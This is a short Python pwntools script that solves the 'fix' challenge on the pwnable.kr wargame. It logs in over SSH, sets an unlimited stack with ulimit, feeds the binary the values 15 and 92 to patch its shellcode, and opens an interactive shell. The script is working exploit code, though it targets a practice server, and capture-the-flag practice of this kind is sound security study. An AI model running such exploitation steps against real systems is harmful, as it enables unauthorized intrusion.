from pwn import *

index = '15'
value = '92'
ssh_pwn = ssh(host='pwnable.kr',user='fix',password='guest',port=2222)
ssh_pwn.run('ulimit -s unlimited')
p = ssh_pwn.process(['./fix'])
print (p.recv(4096))
p.sendline(index)
p.sendline(value)
print (p.recv(4096))
p.interactive()